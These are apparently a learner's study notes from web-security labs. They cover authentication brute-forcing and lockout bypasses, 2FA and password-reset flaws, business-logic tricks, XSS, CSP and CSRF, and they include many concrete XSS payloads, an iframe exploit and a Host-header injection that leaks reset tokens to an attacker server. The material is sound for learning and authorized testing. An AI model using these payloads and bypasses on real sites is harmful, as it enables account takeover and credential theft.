**There are 3 main types: **

- Something you **know:** password or answer to a security question. **Knowledge factors**
- Something you **have: **physical object like phone or security token. **Possession factors**
- Something you **are **or** do: **your biometrics or patterns of behaviour. **Interference factors**
**Brute-force Attacks**

- An attacker uses a system of trial and error to guess valid user credentials.
- These can be automated using the wordlists of usernames and passwords.
**Brute-forcing Usernames**

- It is very common to see the business login forms in the format: firstname.lastname@somecompany.com
- Sometimes even high-privileged accounts are created using predictable usernames like admin or administrator.
- Check if you are able to access user profiles without logging in.
- Check in the HTTP Responses because they sometimes contain email addresses of high-privileged users like **Admin **or **IT support.**
**Brute-forcing Passwords**

- Many websites forces the users to create typical passwords, so that the brute forcing cannot be successful alone to crack it.
- But here the point to catch is  users always create passwords that **they can remember **and also fits in the password policy.
**Example: **If mypassword is not allowed, the user tries Mypassword1! or Mypa$$w0rd instead.

- In some cases, the policy requires the user to change their passwords on a regular basis.
- So instead of changing it completely, the user prefers minor changes.
- Like Mypassword1! becomes Mypassword2! or Mypassword1?.
**Username Enumeration **

- When an attacker is able to observe changes in the website’s behaviour for identifying if a username is valid or not.
While Brute-forcing a login page, pay attention if any differences occur in:

- **Status Codes: **During the attack, the status codes will likely to be same for the majority because all of them will be incorrect. If we find a different status code, then there are strong chances that we got the correct username.
- **Error Messages:** Also check for the error messages. Like if we are brute-forcing for username and the website shows that username is correct and password is incorrect  we got the correct username.
- **Response Times: **If most of the requests are in a similar range and any request is taking longer time to respond, then that means something different is happening behind the scenes.
- In case a website blocks the IP address after a number of tries to login, we can try for the header X-Forwarded-For.
- This header is used to identify the originating IP address of a client connecting to a web server.
- So if a website is blocking our IP, then we can try for this header and write some random IPs to trick the website.

## **To Be Noted!!!**

In the Burp Intruder, if more than one parameters are there for changing (Which we added by this  **$add$**)

Then we have to select the **Pitchfork Attack, **this attack changes the parameter parallely so that its easier to do for these websites like who blocks the **IP Addresses. **

**Flawed Brute-force protection**

- The two most common ways to prevent brute-force attacks are:
- Locking the account that a remote user tries to login many times and fails.
- Blocking the remote user’s IP address if they make too many login attempts in a quick session.
- In some cases, we can bypass this blocking  the counter for the number of failed attempts resets if the IP owner logs in successfully.
- It means we have to login to our own account every few attempts to prevent reaching the limit and being blocked.
**Example: **If any website is only allowing two incorrect usernames and then the limit resets by logging in the correct credentials.

Then in this case to bypass this challenge, we can use the **pitchfork attack**, but in this case we have to do like  Two incorrect & one correct

For this purpose there is a **Resource Pool** in **Burp Intruder** where we can make our custom resource pool and input it 2 requests.

So it will automatically, brute-forces **Two incorrect & one correct.**

**But…. To make it successful ** we have to make some changes in our payload lists  Add correct password after every two incorrect passwords in it **& **add correct username after every two incorrect usernames in the list. (**Make sure to add the correct credentials first so we can be in a safer zone**)

- **In some cases even, **the website don’t locks the invalid username attempts, rather it locks if we are logging in multiple times with **correct username but incorrect password**.
- In that case we can use the **Cluster-Bomb attack **in the **BurpSuite**.
- **In some cases, **the websites uses the **json** input for login.
- So in this case, to overcome the login block here, we can try to input all the passwords in that one same json input and check if it works.
**Multi-Factor Authentication**

- Now-a-days it is common to see the **2FA (Two-factor authentication)** in the websites which asks for **something you know **and **something you have.**
- Sometimes in Two-Factor Authentication  If the user have to firstly enter the password and then have to enter the verification code on separate page, **the user is most probably already in a “****logged-in****” state**, before entering the verification code.
- So, in this case we can check if we are already in a logged-in state after entering the password because sometimes websites don’t check if you have entered the verification code or not.
**Flawed Two-Factor Verification logic**

- Sometimes, in two-factor authentication, after the initial login step, the website doesn’t verify if the same user is completing the second step.
**Example:**

- In a website, a username named **wiener **is logged in with the password.
- Now in the second step, we can check if the website cookie can be useful for any other username input.
- If yes, then we can change the username in the cookie and then brute force the verification code and get the other account logged in without any password.
- In some cases, the website loggs a user out after they enter a certain number of incorrect verification codes.
- In this case we can use **Macros **in **Burp****.**
**Macros **are the automated, predefined sequences of HTTP requests and responses used to automate multistep tasks.

**Key Uses: **

- Automatically fetch a CSRF token from a GET request and use it in a subsequent POST request.
- Auto relogin to an application or visiting the **home **page if the session cookie expires, preventing scan interruptions.
- Executing a sequence of requests to reach a specific state where a vulnerability can be tested.
**Keeping users Logged in**

- Some websites have the **Keep user logged in **button in their login page.
- This function is often implemented by generating its token along with the session token.
- We can take advantage of that cookie to bypass the login.
**Example: **There is a cookie generated for keep user logged in feature.

- We can inspect that cookie either in the **Inspector **or decode it using **Decoder**.
- Then we can check for the hashes used.
- Suppose we find the cookie and decode it and we found wiener: <hashcode> and it is **Base64** encoding.
- We got to know, hash is **MD5**, and the password is written in it.
- Now it is clear that the stay-logged in cookie is in the format:
<username>:<hash_of_password>

- In the burp intruder we can paste our list of passwords in the payloads, and add the rules for it:

```sql
Select hash  MD5
```

- Add prefix  carlos:
- Encoding  Base64
**THERE IS ANOTHER LAB NAMED ****OFFLINE PASSWORD CRACKING, ****BUT IT CONTAINS XSS VULN, SO WILL DO IT AFTER LEARNING XSS.**

**Password Resetting**

- Sometimes there is a need to reset the password, but in many cases **resetting through email **is not safe.
- So there is a way to **reset it through a URL**.
- Some websites use like:
http://vulnerable-website.com/reset-password?user=victim-user

- This is easily guessable and we can change the victim-user to any user to get another user’s password.
- So, a better implementation to this process is to generate a token for this purpose like:
http://vulnerable-website.com/reset-password?token=<token-redacted>

- This token expires after a short period of time or be destroyed immediately after resetting the password.
- Sometimes the websites fail to validate the token again, so an attacker can  Visit the reset form from their own account  Delete the token  And even then can see that they can reset the password.
- In some cases, we can use the token of another user to reset the password of our account.
**Example: **

- In a website, we go to the **forgot password **page and send it to the burp repeater (**POST Request**)**.**
- After that we can check there if the **X-Forwarded-Host **is applicable there or not, if yes then simply we can copy the another user’s URL (**From the exploit server in ****Portswigger**).
- Then check the access log, we can find our required token there.
- In some cases, we can also check if in the request, we can change the Host address or not.
- If yes then we can directly input our URL into it and using the token we can reset the password of our required user.
- If the URL sent to the user is dynamically generated based on controllable input such as **Host header**
- We can modify this header so that it points to our controlled domain.
- This below example uses **Dangling Markup **technique
- This means an attacker steals sensitive data from a webpage by injecting an **Unclosed HTML** tag or attribute.
**Example: **

- In a website, the forgot password contains a host header, but we checked that it cannot be removed.
- And in the email client we get a link in which the password is reset and we got a new password. We can check its HTML form.
- Now we can check, in the **Host **header, we can inject the HTML into that.
- **Like: **
**Host: ***WEBSITE-URL*:<a href=“//*EXPLOIT-SERVER-URL*/?

And change the username to the target username.

- Then we can see in the access log, there is a login GET request shown, in which the target’s password is shown.
**Changing user passwords**

Websites demand for our current password and new password (two times) for changing the password.

This functionality can also be dangerous if it allows an attacker to access it directly without logging in as a user.

**Example:**

- In a website, we have a user’s account and try to change the password.
- We can notice that when in the current password, we write the wrong, it loggs out our account and blocks for a certain time.
- And if we write different passwords in the new password boxes, we get an alert. Using this alert we can brute force the password of our required username.
**!!!! ****WILL DO OAUTH 2.0 LATER ****!!!!**


## **Business Logic Vulnerabilities**

- These are the flaws in the design and implementation of a website which an attacker can misuse.
- The business logic is only a term, this doesn’t mean directly **business, **it can be referred as **“application logic vulnerabilities” **or **“logic flaws”**.
**Examples of Business Logic Vulnerabilities**

- One example for that is we have to check the **Requests **sometimes in **Burp Proxy** like **Post.**
- We can also check if the application asks for an integer input, then in that case we can also check by inputting the **negative integer** and check if anything goes right or not.
- All in all we have to observe these things:
Are there any limits that are imposed on the data?

What happens when you reach those limits?

Is any transformation or normalization being performed on your input?

**Example: **In a shopping application, No. of items takes integer input.

Here we can try negative input (**Using Burp**) . And check for the rate of the product on the cart, if it becomes negative then the vulnerability is there.

After that we can use another product for negative rate changing. And then we can buy the required product according to our balance.

Sometimes, if a website restricts the users to use any specific domain, Like for an admin panel a website says that he should be a **dontwannacry **user.

It means his email should have the **dontwannacry **domain.

So as a regular user, we cannot get the admin panel as we aren’t dontwannacry user.

Here we can do some tricky things like, we can try exceptionally long string before our mail address.

Suppose we have mail **@exploit-server.net, **we can add very long string before **@** then login then we can see the website sometimes truncate the string. So suppose our very long string is truncated to 255 characters.

Now we got the key!!!  We can use the dontwannacry email domain after the long string so that the **m **in the **dontwannacry.com **will be the 255th character here and add our own mail address after that. By this the website truncates the 255 characters and automatically after we login it shows us that our email is dontwannacry user email, but it truncates the remaining part which is our own email.


## **!!!! ****To Be Continued ****!!!!**


## **Cross Site Scripting**


## **Xss**

- A vulnerability that lets attacker-controlled input execute JavaScript in another user's browser, in the context of a vulnerable website.
Basic test: <script>alert(1)</script>

**Common proof of execution:** alert(document.domain)

- **alert()** is a common way to confirm JavaScript execution, but it does not work in every context.
- If a payload fails, inspect the context and browser behavior before assuming XSS is impossible.
- **print()** may also be useful as a harmless proof of execution in some situations.
- And also there is sometimes **textarea breakout. ** This means, we can check out for vulnerability also by
</textarea><script>alert()</script>

**Remember:** No single payload works everywhere.

**Types of XSS**

- **Reflected XSS ** Input from a request is returned in the response and becomes executable.
- **Stored XSS ** Attacker-controlled input is saved and later processed unsafely when displayed.
- **DOM-based XSS ** Client-side JavaScript processes attacker-controlled data unsafely, leading to execution.
**Remember:** Reflected and stored describe how data reaches the victim; DOM-based describes where the unsafe processing happens. These categories can overlap.

**How to find Reflected XSS vulnerabilities:**


```bash
Find all input points:
```

Check every place where user can send data to the application.

- URL parameters (?id=123)
- Form fields
- Request body (POST data)
- URL path (/usr/john)
- HTTP header (User-Agent, Referer, etc)
All in all test every place where input is accepted.

- **Send a Random Value**
Enter a unique random string like : abc123xy or anything.

You just have to check whether your response appears back in the response page.

- **Look for Reflection**
Search the response for your random value.

If the value appears, it is reflected.

- **Identify the Context**
See where the value is reflected.

**Inside HTML text : **<p>abc123xy</p>

**Inside an attribute : **<input value=**“**abc123xy”>

**Inside Javascript : **var name = “abc123xy”

You have to understand the location because payloads depend on the context.

- **Test basic XSS payload**
Now replace that random value with a simple payload:

<script>alert(1)</script>


## **Or**

<img src=x onerror=alert(1)>

Check if it appears unchanged in the response.

- **Try Bypasses if blocked**
Now if the application removes characters, encodes input, blocks scripts

Then we can try different payloads that fit the context.

We have to find a payload that executes javascript.

- **Verify in browser**
If the payload is successful in **Burp. **

Open it in a real browser and check whethere javascript actually runs.

Common Test : alert(document.domain)

If a popup appears, XSS is confirmed.

**Practical method:**

- Send a unique marker, such as abc123xy.

```bash
Find where it appears in the response or DOM.
```

- Identify the context: HTML text, attribute, JavaScript, or another location.
- Choose a test suited to that context.
- Confirm whether JavaScript actually executes.
**Remember:** A value appearing unchanged in the response does not prove XSS.

**If tag is blocked: **

- Sometimes, we notice that the tag we input is blocked, then we can check from **Burp Intruder **if any tags are by mistakenly allowed.
- We can do this by sending the search query request to the **Burp Intruder** and type <> in its search input and between the angular brackets we add §§  <§§>. And start the attack with the available list of tags in **XSS cheatsheet of Burp.**
- After finding the tag, we can then find the allowed attribute with the same approach.
- But also after this finding, we cannot pass the script and it executes. Now we have to create and inject the script into the exploit server.
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E onload=this.style.width='100px'

**This script means **

- **<iframe src=“…….” ** iframe load another page inside the current page.
- The URL is the web security academy lab URL, and the search query is HTML encoded. It is  search=”><body onresize=print()>
- It starts with **“> **because, if user input is reflected inside an HTML attribute, the injected **“> **closes the existing attribute and tag allowing an attacker to inject new HTML.
- Then there are **body **tag and **onresize **attribute which we have already found. And then the **print() ** function which is used to find is the website is vulnerable to XSS or not.
- After that there is **onload=this.style.width=’100px’**  this means when the **iframe **finished loading **, ****this.style.width=’100px’ **executes.
- This means the iframe’s width is changed after loading.
- Resizing was needed because the attribute **onresize **was allowed, so when iframe loads the vulnerable page, the injected HTML creates <body onresize=print()>
**Reknowned tags are blocked: ****But we can input custom tags here.**

- Like if we want to check if there is any custom tag then we can do like this
<custom-tag onmouseover=’alert(1)’>

- Now when we hover the mouse on the output then we get the alert, but this needs user interaction. **But the XSS is always better if it is automatic.**
- So for this we can use the attribute, onfocus.
<custom-tag onfocus=’alert(1)’> id=”x”

- Here, in the above URL we are using an attribute **id **which focuses on a particular element from the URL.
- See if **id=x, **then for executing the script, in the end of the URL, there should be **#x.**
- But there is a problem in the custom tags that they are not focusable, that means  we used the attribute onfocus, but <custom-tag onfocus=’alert(1)’ id=”x”> is not by default focusable.
- So here we have to use **tabindex=1, **which tells the browser that this element can receive keyboard focus.
- So now we can type this in the search box
<custom-tag onfocus=’alert(document.cookie)’ id=x>

- And then in the URL, add **#x **at the end, and copy the URL. After that in the portswigger lab, we can goto exploit server and type this
<script>location=’https://LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script>

- And in real world or Bug bounty, we can directly modify the URL and add the #x there, and make the poc for that. No need of exploit server there.
**Remember:** tabindex makes an element focusable; it does not guarantee that focus occurs automatically. Check how focus is triggered and whether the event handler actually runs.

**Site blocks common tags but misses some SVG tags and events**

- If we check, then on some sites, if everything is blocked, some SVG tags are allowed. Like <svg>,<animatetransform>,<title>,<image>.
- Then we can check for attributes allowed.
- These tags will work like this: <svg><animatetransform onbegin=alert(1)>
**XSS in HTML tag attributes**

- Sometimes, this works: “><script>alert()</script>
- But also at many websites, either the angle brackets are blocked or encoded.
- So in this case, we can create a a script like this:
“ autofocus onfocus=alert() x=”

- Here, the **autofocus** attribute tries to trigger the **onfocus** event automatically without any user interaction.
- **x=” **is just an HTML repair, name could be anything, **x **is only as an example.
**Scriptable Attribute **

- Sometimes, there is scriptable attribute available. Like in the above exercises, there was the **value** attribute, which is not scriptable, so we had to escape that with **”**.
- But in some cases there is no need of any escaping, we can directly write the script into that attribute. Like:
<a href="javascript:alert(document.domain)">

**Using canonical link tag**

- In some websites, angle brackets are encoded but then also there are chances to inject attributes, into an existing element.
- Lets suppose there is a <link> tag. But neither it is visible nor can be clicked nothing can be done. So here nothing works like onmousehover and all.
- So here, we have to use **Access Keys: **‘ accesskey="x" onclick=’alert(1)
Now this will result in: <tag accesskey=”x” onclick=”alert(1)”>

- This makes the browser to create a keyboard shortcut. So when we press **ALT+SHIFT+x ****OR ****CTRL+ALT+x ****OR ****ALT+x**  the element is activated.
**Into Javascript**

- Suppose a page contains:
<script>var input = ‘ABC123’;</script>

- Here we can clearly see that input is inside **javascript **not **HTML**.
- So here we can try to inject
</script><img src=1 onerror=alert(document.domain)>

- This makes the original query:
<script> var input = ‘</script>< img src=1 onerror=alert(document.domain)>’;</script>

- Here we see the injected script is inside code, but the HTML parser never care about the Javascript strings, it just thinks that when got the **</script> **tag, the query ends.
- We can test like, injecting **</script> TEST. **If breakout works, then we can test our own payload.
**Breaking out the JS string**

- Sometimes , the page can contain  suppose:
<script>var search = ‘ABC123’;console.log(search);</script>

- Here we can inject  ';alert(document.domain);//
- **‘****; **closes and finishes the recent string.
- **alert(document.domain); **executes the code, its our main payload.
- **// **it comments out the rest, because if we don’t put this here, then there will be a syntax error.
- The browser now reads:
- var search='';alert(document.domain);//';
- We can also inject  ‘-alert(document.domain)-‘
- Here **–** is the subtraction operator.
- By this, javascript evaluattes:
- empty string-alert(…)-empty string
- We use **– **because sometimes filters block **; **or** //****,** but they don’t block **–**
**‘ , ; ****,**** “> are escaped**

- Sometimes, if we write ';alert(document.domain);// but the browser escapes the single quote character with a backslash.
- Assuming easily, input is:
';alert(document.domain)//

- But it gets converted into:
\';alert(document.domain)//

- So alternatively, we can use this payload:
\';alert(document.domain)//

- Then it will get converted into:
\\';alert(document.domain)//

- So here the first backslash means the second backslash will be interpreted, not as a special character. Therefore the attack succeeds.
**Using the HTML encoding**

- Suppose the page contains:
<a href=”#” onclick=”var input=’USER INPUT’; doSomething();”;

Click

</a>

- Our input is not inside a **script **tag, it is inside an HTML attribute. And inside that attribute, there is Javascript.  **Javascript string inside an HTML attribute**
- Here in normal cases we use, ‘;alert(…);//, but in this case here **‘** is blocked. That is we can solve it by HTML encoding.
- So, instead of **‘ **, we can write **&apos;**
- Our payload can be like &apos;-alert(document.domain)-&apos;
- It is like  ‘-alert(document.domain)-‘
**XSS via template literals**

- Some websites use the **backticks (****`****) **while inputting something from a user, instead of **‘’ **or** “”**. This is called **template literal. **
- In JavaScript template literals, **${...}** evaluates a JavaScript expression and inserts its result into the string.
Example context:

<script>var input = \USER_INPUT`;</script>`

**Think:** Can attacker-controlled input introduce an expression into the template literal, or is it safely treated as data?

**Remember:** ${...} is evaluated in a JavaScript template literal; it is not automatically executed in every context where those characters appear.

**Step ahead**** alert()**

- Now we know that how to write alert function to find if XSS can be inputted or not.
- But after that what to do  **exploit.** One traditional way to do that is to steal the cookies.
**!!!! ****WILL DO AFTER COMPLETING CSRF** **!!!!**

**Steps to check for Stored XSS:**


```bash
Find the entry point:** Where can you submit data, such as a comment, profile field, or message?
```


```bash
Find the output point:** Where does the submitted data appear later?
```

- **Identify the context:** Is the data placed inside HTML, an attribute, JavaScript, or a template?
- **Inspect the processing:** Check whether the application encodes, sanitizes, or unsafely interprets the data.
- **Verify execution:** Confirm whether the data can actually execute JavaScript.
**Remember:** The input and output may appear on different pages. Stored XSS requires tracing the data from submission to where it is later processed.

**DOM Based XSS:**

It occurs when client-side javascript processes an attacker-controlled data unsafely and causes script execution in the browser.

**Pattern:**** SOURCE ****→**** FLOW/PROCESSING ****→**** SINK ****→**** CONTEXT ****→**** EXECUTION**

**Common Sources:**

- **location.search **— query string
- **location.hash **— URL Fragment
- **location.href **— full URL
- **document.referrer **— referring page
- **window.name**
- **postMessage event data**
**Common Sinks:**

- **element.innerHTML**
- **element.outerHTML**
- **document.write()**
- **element.insertAdjacentHTML()**
- **eval()**
- **new Function()**
**IMPORTANT:** A source or sink alone does not prove XSS. Trace attacker-controlled data from source to sink, then check how the value is interpreted, whether it is encoded or sanitized, and whether a specific trigger is required.

**Other sinks to recognize:**

- element.onevent — event-handler properties; risky when attacker-controlled input becomes executable handler code.
- jQuery methods such as .html(), .append(), .prepend(), .after(), .before(), .replaceWith(), and $.parseHTML() — investigate how they handle attacker-controlled data. Their presence alone does not prove XSS.
**DevTools:**

- Ctrl + F  search DOM
- Ctrl + Shift + F  search JavaScript
**Main Question: ****Where did my input go?**

**Main Mental Model: ****SOURCE ** **FLOW ** **SINK **** CONTEXT **** EXPLOIT**

**DOM XSS — Source & Sinks**

**document.write()**

document.write(userInput)  can write HTML into the document.

Basic Test: Use a harmless proof of execution in the authorized lab, then inspect the browser's behavior.

**Practical trick: ****Identify the sink first. A payload that works with one sink may not work with another.**

**Can the input be interpreted as HTML, and can that HTML cause JavaScript execution?**

**innerHTML**

element.innerHTML=userInput

<script> inserted through innerHTML does not execute in modern browsers.

Alternative concept: <img src=1 onerror=alert(document.domain)>

**Practical trick: ****Injected <script> elements generally do not execute when inserted using innerHTML in modern browsers. That does not make ****innerHTML safe: other HTML features, such as event handlers, may still create an execution path.**

**What HTML element + event can give me execution??**

**Third-Party Libraries**

Libraries and frameworks can introduce their own **sources **and **sinks.**

**SOURCE ** **Javascript ** **Library Function **** SINK **** XSS**

**When testing a site, don’t only search for: **

innerHTML, eval(), document.write()

Also look how libraries process attacker-controlled data.

**jQuery ****.attr()**

$('#backLink').attr("href", USER_INPUT);

If  USER_INPUT  location.search

Then  location.search  returnUrl  .attr(“href”, …)                   <a href=”USER_INPUT”>

**Practical trick: ****Controlling an href value is not automatically XSS; the resulting URL and its execution context matter.**

**IMPORTANT: ****href **can contain an executable javascript URL: javascript:…

**Investigation steps:**

- **Trace attacker-controlled input to the href attribute.**
- **Check whether the resulting URL uses a dangerous scheme, such as javascript:.**
- **Determine whether execution requires clicking the link or another user action.**
**jQuery ****$() ****selector**

$(location.hash)

Flow  location.hash $()  jQuery  possible DOM XSS

**Earlier some jQuery version allowed HTML-like input through $(), but modern versions patched the common case where the input begins with a ****#, ****but unsafe uses may still exist.**

**So the question is: ****Does attacker controlled data reach $()?**

**Practical trick: ****If the input reaches $(), inspect how that specific jQuery version interprets the argument. Do not assume every selector is vulnerable or that every version behaves identically.**

**Hashchange**

$(window).on('hashchange', function() {

var element = $(location.hash);

});

Meaning  Hash changes  hashchange event  vulnerable code runs

Finding the sink isn’t always enough.

**So the question is: ****What causes this code to execute?**

Sometimes we need to trigger an event automatically.

**Practical trick: ****Trace both the vulnerable operation and its trigger. If the code runs only after a hash change, investigate how that event can occur in the lab. Finding a sink is not enough if the vulnerable code never executes.**

**AngularJS**

AngularJS can process : {{ expression }} when angular is active on the page.

<div ng-app>        {{ something }}</div>

So DOM XSS may happen through:

USER INPUT  AngularJS  {{ expression }}  Angular evaluates expression  possible javascript execution

**Practical trick: ****First confirm that AngularJS processes the attacker-controlled value as a template expression. Visible {{...}} syntax alone does not prove that AngularJS is active or that XSS is possible.**

**IMPORTANT :** angularJS doesn’t necessarily require **<script> **or **onerror=**

**So the question is: ****Is Angular interpreting my input as an Angular expression?**

**Practical Checklist:**


```bash
Find the source:** Where does the attacker-controlled input originate?
```

- **Trace the flow:** Which variables or functions process the input?
- **Identify the sink: **Which library or framework operation receives it?
- **Understand the behavior: **Does it create HTML, set an attribute, or evaluate an expression?
- **Check the context: **Where exactly is your input being used?
- **Check the trigger: **Does execution require a click, event, or other action?
- **Test the lab: **Use a harmless proof of execution such as alert(document.domain).
- **Confirm the result****: **Verify that JavaScript actually executes in the lab's page context.
**Practical Lessons: How to Think in Different DOM XSS Situations**

**Situation 1: ****Input appears in the server response.**

Think: Reflection may be only the first stage.

Do: Trace the reflected value into client-side JavaScript and identify the final sink.

Remember: Reflection alone does not prove XSS.

**Situation 2: ****Input is stored and appears on another page.**

Think: Submission and execution may happen in different requests or pages.

Do: Trace submission → storage → retrieval/rendering → sink → execution.

Remember: Investigate the page that processes the stored value, not only the page where you submitted it.

**Situation 3: ****Input appears in the DOM but does not execute.**

Think: The value may be treated as text, encoded, sanitized, or used in a non-executable context.

Do: Inspect the exact sink, context, transformations, and trigger.

Remember: Visible input is not proof of executable input.

**Situation 4: ****A payload fails even though the sink looks dangerous.**

Think: The sink's behavior and the input context determine what can execute.

Do: Inspect the JavaScript flow and browser behavior before changing the payload.

Remember: Do not guess payloads blindly; understand the execution path.

**Exploiting Cross-Site Scripting (XSS)**

**1. Proving XSS**

alert(document.domain) is a common way to confirm JavaScript execution and show which domain's page context is executing it.

Think: Is my input actually executing as JavaScript, or is it just appearing on the page?

Remember: Seeing your input reflected in the page does not prove XSS. Confirm actual execution.

**2. Cookie and Session Security**

Websites often use cookies to maintain logged-in sessions. If JavaScript can access a session cookie, it may expose sensitive session information.

**What to check:** Is the cookie accessible through document.cookie?Does it have the HttpOnly flag? This normally prevents JavaScript from reading it.Does the application have additional session protections?

**Practical trick: ****Don't assume that XSS automatically means session hijacking. First understand which cookies are accessible and what they are used for.**

Real-world point: Even if a cookie is protected by HttpOnly, XSS may still allow actions through the victim's authenticated browser.

**3. Password Autofill and Input Security**

Password managers can automatically fill saved credentials into login forms. If a page has XSS, injected code may create risks for sensitive information entered into or exposed by that page.

**What to consider:**Does the browser or password manager autofill the credentials?Is the password field accessible to page JavaScript?Does the behavior depend on the browser, form structure, or user settings?

**Practical trick: ****Never assume a password field automatically receives a saved password. Autofill behavior varies, and the actual behavior must be verified.**

Real-world point: Password managers help protect credentials, but they do not make a page with XSS trustworthy.

**4. XSS and CSRF Protection**

CSRF tokens help a website verify that sensitive requests are legitimate. However, XSS running in the same origin may be able to read accessible page content, obtain a CSRF token, and interact with the application using the victim's session.

How to think:Identify the sensitive action, such as changing an account email.Find how the application obtains and submits its CSRF token.Determine whether same-origin JavaScript can access the token.Understand how the authenticated request is processed.

**Practical trick: ****A CSRF token is not a reliable defense against XSS that executes in the same origin. Preventing XSS is essential.**

**Remember the difference:**

**CSRF:** An attacker may cause a victim's browser to send a request.

**XSS:** Injected JavaScript may also read accessible page data and interact with the application.

**5. General Method: Assessing XSS Impact**

When you discover XSS, don't stop after confirming JavaScript execution. Think about what the code can access and do.

**Data:** What sensitive information is accessible to JavaScript?

**Authentication:** Can it access session-related information?

**Actions:** What can the logged-in user do through the application?

**Protections:** Do cookie flags, permissions, or other controls limit the impact?

**Conditions:** Does the behavior require a click, autofill, or another user action?

**Core principle:** XSS impact depends on the application's functionality, the execution context, and the protections in place—not just the fact that JavaScript executes.

**XSS: Real-World Testing Method**


```bash
Find input:** Check URL parameters, forms, comments, profile fields, and other user-controlled data.
```

- **Trace the output:** Find where the input appears and whether the server or client-side JavaScript processes it.
- **Identify the context:** HTML text, an HTML attribute, JavaScript, a URL, or a client-side template.
- **Check protections:** Look for encoding, sanitization, filtering, and relevant browser behavior.
- **Test the execution path:** Determine what the input can do in that context and whether a click or other event is required.
- **Assess impact:** Determine what the vulnerability could expose or allow an attacker to do.
- **Report clearly:** Record the affected input, reproduction steps, evidence, impact, and recommended fix.
**Main lesson:** Don't rely on memorizing payloads. Understand the context, trace the data flow, and choose tests based on what you observe.

**Content Security Policy (CSP) — Practical Notes**

**1. What is CSP?**

CSP is a browser security mechanism that restricts which resources a webpage can load and which scripts can execute. It helps reduce the impact of XSS but does not fix the underlying XSS vulnerability.

The policy is usually delivered through the HTTP response header:

Content-Security-Policy

**2. Important Directives**

- **script-src** — controls script sources and execution.
- **script-src-elem** — controls script elements specifically.
- **img-src** — controls image requests.
- **default-src** — fallback for resource types without a specific directive.
- **frame-ancestors** — controls which origins can embed the page.
- **report-uri** — legacy directive for CSP violation reporting.
Examples:

- script-src 'self' — generally restricts scripts to the same origin; inline scripts are not automatically allowed.
- img-src 'self' — restricts images to the same origin.
- frame-ancestors 'none' — prevents the page from being framed.
**Practical trick:** **Always inspect the complete CSP header. One directive alone does not tell you what the whole policy permits.**

**3. Nonces, Hashes, and Trusted Sources**

CSP can trust scripts using:

- **Source allowlists:** permitted script origins.
- **Nonces:** unpredictable values that must match between the policy and script element.
- **Hashes:** cryptographic hashes matching the trusted script content.
**Testing method:** If a script is blocked, inspect the policy and browser console to understand why. Don't assume that another <script> tag will bypass it.

**4. CSP and Data Exposure**

Even when JavaScript is blocked, other resource requests may still be allowed.

**Think:** Can injected HTML trigger a request, and does the policy permit that request?

- Check the relevant directive, such as img-src.
- Determine whether attacker-controlled markup is interpreted as HTML.
- Check whether browser protections or other restrictions block the request.
**Remember: ****Blocking scripts does not automatically block every possible data-exposure technique.**

**5. Dangling Markup**

Dangling markup occurs when attacker-controlled input can leave HTML markup unfinished, potentially causing following page content to be interpreted as part of that markup.

**Method:**


```bash
Find where input enters the HTML.
```

- Inspect the surrounding element or attribute.
- Determine whether following content could be captured.
- Check whether the resulting request is permitted by CSP.
- Check for browser protections and required user interaction.
**Remember: ****Dangling markup may expose data without executing JavaScript. It is not automatically XSS.**

**6. CSP Policy Injection**

**Situation:** User-controlled input appears inside the CSP response header.

**Method:**

- Inspect the actual response header in Burp or DevTools.
- Trace where the user-controlled value enters the policy.
- Understand the directive structure and browser parsing rules.
- Check whether the resulting policy actually weakens protection.
**Remember: ****Adding a semicolon does not automatically let you overwrite an existing directive. Duplicate directives and browser behavior matter.**

**7. Clickjacking Protection**

frame-ancestors controls which sites can embed a page in a frame.

- 'none' — no site can frame the page.
- 'self' — only the same origin can frame it.
- Specific origins — allow selected sites to frame it.
**Testing method:** Inspect CSP and X-Frame-Options, then determine whether an unauthorized origin can embed the page.

**8. Practical CSP Testing Checklist**


```bash
Find the Content-Security-Policy response header.
```

- Read the complete policy and identify relevant directives.
- Check browser console messages for blocked resources or scripts.
- Determine what is allowed, blocked, and trusted.
- Investigate whether the issue is script execution, data exposure, or framing.
- Verify the behavior in the browser instead of assuming a bypass worked.
**Main lesson:** Understand what the policy allows, what it blocks, and which browser behavior matters before choosing a test.


## **Cross Site Request Forgery**


## **Csrf**

**What is CSRF?**

Cross-Site Request Forgery (CSRF) is a vulnerability in which an attacker tricks an authenticated user's browser into sending an unwanted request to a web application.

The browser may automatically attach the user's session cookie, causing the application to treat the request as a legitimate action performed by that user.

**Example:** A user is logged into a banking application. An attacker tricks them into visiting a malicious page that submits a transfer request to the bank. If the browser sends the user's session cookie and the application doesn't validate the request properly, the transfer may be processed.

The attacker doesn't need to steal the session cookie. They abuse the browser's existing authenticated session.

**How CSRF Works**

A typical CSRF attack follows this process:

- The victim logs into a vulnerable application.
- The application stores a session cookie in the browser.
- The victim visits an attacker-controlled website.
- The attacker's page triggers a request to the vulnerable application.
- The browser automatically attaches applicable authentication credentials.
- The application accepts the request and performs the action.
**Role of Same-Origin Policy (SOP)**

The Same-Origin Policy restricts how one origin can access resources belonging to another origin. However, it doesn't prevent all cross-origin requests from being sent.

**E****xample:** HTML forms can submit requests to other origins even though the initiating website generally cannot read the response.

CSRF abuses this difference between sending a request and reading its response.

**Impact of CSRF**

The impact depends on the functionality being targeted.

- Changing an account's email address can potentially lead to account takeover through password recovery.
- Changing a password can result in account compromise if additional verification is not required.
- Transferring money can cause financial loss.
- Modifying user permissions can lead to privilege escalation.
- Targeting an administrator can potentially compromise the entire application.
Always investigate the consequences of the targeted action rather than judging severity only by the endpoint.

**Three Conditions Required for CSRF**

**A. Relevant Action**

The application must contain an action that an attacker wants to trigger.

Examples:

- Changing email or password.
- Transferring funds.
- Modifying account settings.
- Creating users or modifying permissions.
During testing, prioritize sensitive account-management, administrative and financial functionality.

**B. Automatic Credential Handling**

The application must rely on credentials that the browser automatically attaches to requests.

Common examples:

- Session cookies.
- HTTP Basic authentication.
- Client certificate-based authentication.
Check how the application authenticates users and whether credentials are automatically included in cross-site requests.

**C. No Unpredictable Request Parameters**

The request must not require secret or unpredictable values that an attacker cannot determine.

For example:

email=attacker@example.com

This is easy to reproduce.

However, if the application requires the victim's existing password or a properly validated, unpredictable CSRF token, an attacker may not be able to construct a successful request.

Don't assume a parameter named token provides protection. Investigate whether it is unpredictable, validated and appropriately bound to the user or session.

**Identifying and Testing CSRF**

When testing an application:

- Identify sensitive actions such as changing email, passwords, account settings or permissions.
